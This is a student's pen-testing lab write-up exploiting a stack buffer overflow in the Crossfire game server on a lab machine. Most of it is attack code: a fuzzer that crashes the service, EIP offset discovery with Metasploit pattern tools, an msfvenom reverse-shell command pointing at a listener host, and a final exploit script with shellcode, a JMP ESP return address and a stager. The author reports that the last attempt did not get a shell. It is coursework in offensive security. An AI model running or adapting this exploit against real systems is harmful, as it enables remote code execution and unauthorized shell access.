---
tags:
  - pen-testing
---
## Lab 5

*by Vaughn Valle*

Metasploitable machine running Crossfire: `192.168.1.180`

### The minimum number of bytes needed to cause a crash (per slide 12)
First need to figure out which port Crossfire is running on.
```bash
nmap -sN 192.168.180
```

Without Crossfire running
![[Pasted image 20250402221003.png]]
With Crossfire running
![[Pasted image 20250402220931.png]]
We see a new service pop up using `13327/tcp` when Crossfire is running. This is likely the port Crossfire listens to.

We then create a python script that brute forces the # of bytes needed till we crash.
```python
#!/usr/bin/python
import socket as so
import time
import sys
import subprocess
import re

def fuzz_crossfire(server_ip, server_port):
    """Fuzz Crossfire by sending buffers of increasing size until it crashes"""
    
    # Initial setup
    buffer_prefix = "\x11(setup sound "
    buffer_suffix = "\x90\x00#"
    
    # Counter for fuzzing iterations
    counter = 1
    # Starting buffer length (besides prefix and suffix)
    current_length = 100
    # Maximum buffer length to try
    max_length = 5000
    # Step size for increasing buffer length
    step_size = 20
    
    print(f"[*] Starting fuzzing on {server_ip}:{server_port}")
    print(f"[*] Using buffer prefix: {buffer_prefix}")
    print(f"[*] Using buffer suffix: {buffer_suffix}")
    
    # Test connection first
    try:
        s = so.socket(so.AF_INET, so.SOCK_STREAM)
        s.connect((server_ip, server_port))
        s.recv(1024)
        s.close()
        print("[+] Connection successful")
    except:
        print("[!] Connection failed, check if Crossfire is running")
        return
    
    # Begin fuzzing loop
    last_success = 0
    while current_length <= max_length:
        try:
            # Create socket and connect
            s = so.socket(so.AF_INET, so.SOCK_STREAM)
            s.settimeout(5)
            
            # Create our payload
            buffer_content = "A" * current_length
            string = buffer_prefix + buffer_content + buffer_suffix
            
            # Connect and send payload
            s.connect((server_ip, server_port))
            
            # Wait for banner
            s.recv(1024)
            
            # Send payload
            print(f"[*] Fuzzing with {len(string)} bytes")
            print(f"[*] Buffer size (without prefix/suffix): {current_length}")
            s.send(string.encode())
            
            # Try to receive response (if server still alive)
            try:
                s.recv(1024)
                s.close()
                print("[+] Server still running")
                last_success = current_length
            except:
                print("[!] No response from server")
            
            # Increment counter and buffer size
            counter += 1
            current_length += step_size
            
            # Wait before next attempt
            time.sleep(0.2)
            
        except so.error as e:
            print(f"[!] Socket error: {e}")
            
            # If we get a connection refused, the server has likely crashed
            if "refused" in str(e).lower():
                print(f"[+] Server crashed!")
                print(f"[+] Last successful buffer size: {last_success}")
                print(f"[+] Crash occurred at buffer size: {current_length}")
                print(f"[+] Minimum bytes to crash: {current_length}")
                break
            
            time.sleep(3)
        except Exception as e:
            print(f"[!] General error: {e}")
            time.sleep(3)
    
    print("[*] Fuzzing complete")

if __name__ == "__main__":
    # Define server to target
    server = "192.168.1.180"  # IP of the local host
    
    # Find the port
    port = 13327
    
    # Run the fuzzer
    fuzz_crossfire(server, port)
```

Run the script
```python3
python3 exploit.py
```

One thing I noticed is that the program doesn't really respond well with high `step_sizes` so I brought it down to `20` instead. Here the program starts at buffer size `100` and increments by `20` until we don't get a conn refused indicating that the program crashed! 

Here's the initial result with a `step_size` of `20`:
![[Pasted image 20250402222240.png]]
Starting at `4300` and reducing `step_size` to `1` allows us to pinpoint the exact buffer size needed to crash Crossfire:
![[Pasted image 20250402222800.png]]
So the min no. of bytes to crash the program is `4377` bytes
### The memory location of EIP (per slide 18)

First we run Crossfire and debug via `gdb`
```bash
gdb --args ./crossfire
```
Then run and check `EIP` reg value
```gdb
run
info registers
```
Default register table
![[Pasted image 20250402232151.png]]
These are our default values. Now let's try to overwrite `EIP` with BOF

To get the EIP offset, let's create a pattern with `msf` using our previously obtained minimum byte size of `4377` for program crash, and save it to a txt file for easy copy-pasting
```bash
msf-pattern_create -l 4377 > pattern.txt
```
and create a simple python script to crash
```python
#!/usr/bin/python
import socket as so

server = "192.168.1.200"
port = 13327

# Replace with your pattern from pattern_create.rb
pattern = <contents from pattern.txt>

try:
    s = so.socket(so.AF_INET, so.SOCK_STREAM)
    string = "\x11(setup sound " + pattern + "\x90\x00#"
    s.connect((server, port))
    print "\nSending pattern of %s bytes" % len(string)
    s.send(string)
    s.close()
except:
    print "[!] Connection refused, check debugger"
```
And then find EIP offset with `pattern_offset`
```bash
msf-pattern_offset -q 0x41367241 -l 4337
```

We can then verify that EIP contains `0x42424242`
![[Pasted image 20250402235643.png]]
### A screenshot of your final working exploit within Kali Linux (per slide 44)

We setup an Arch listening machine at `192.168.1.200` and create a payload with`msfvenom`
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.200 LPORT=12345 -a x86 -f python --platform linux -b "\x00\x20" -e x86/shikata_ga_nai
```

We then use this payload for out final exploit using our `jmp_esp` address obtained from the prev section
#### Final (almost working exploit)
```python
#!/usr/bin/python
import socket as so

server = "192.168.1.180"
port = 13327

# msfvenom reverse shell payload (replace with your generated payload)
buf =  b""
buf += b"\xbf\x7e\xa5\x2c\x6b\xdb\xc5\xd9\x74\x24\xf4\x5d"
buf += b"\x31\xc9\xb1\x12\x83\xc5\x04\x31\x7d\x0e\x03\x03"
buf += b"\xab\xce\x9e\xca\x68\xf9\x82\x7f\xcc\x55\x2f\x7d"
buf += b"\x5b\xb8\x1f\xe7\x96\xbb\xf3\xbe\x98\x83\x3e\xc0"
buf += b"\x90\x82\x39\xa8\xe2\xdd\xbb\xe0\x8b\x1f\xbc\xc0"
buf += b"\x72\xa9\x5d\x90\xe3\xf9\xcc\x83\x58\xfa\x67\xc2"
buf += b"\x52\x7d\x25\x6c\x03\x51\xb9\x04\xb3\x82\x12\xb6"
buf += b"\x2a\x54\x8f\x64\xfe\xef\xb1\x38\x0b\x3d\xb1"
# ... rest of payload ...

# Exploit components
jmp_esp = "\x8f\xf4\xff\xbf"  # Replace with your JMP ESP address (in little endian)
esp_stager = "\x83\xc0\x0c\xff\xe0"  # add eax,12; jmp eax

# Building the full payload
#offset = 4368
offset = 4371
nops = "\x90" * 20  # NOP sled

# Structure: command + [12 byte offset] + [shellcode] + [padding to EIP] + [JMP ESP addr] + [stager at ESP]
exploit = "\x11(setup sound " + "\x90" * 12 + nops + buf + "A" * (offset - len(nops) - len(buf) - 12) + jmp_esp + esp_stager

try:
        s = so.socket(so.AF_INET, so.SOCK_STREAM)
        print ("\nSending exploit of %s bytes" % len(exploit))
        s.connect((server, port))
        s.send(exploit + "\x90\x00#")
        s.close()
except:
        print ("[!] Connection refused, check debugger")
```

![[Pasted image 20250402234441.png]]
![[Pasted image 20250402234608.png]]
![[Pasted image 20250402233612.png]]
#### (FAILED) Did not get shell 

Could likely be incorrect EIP offset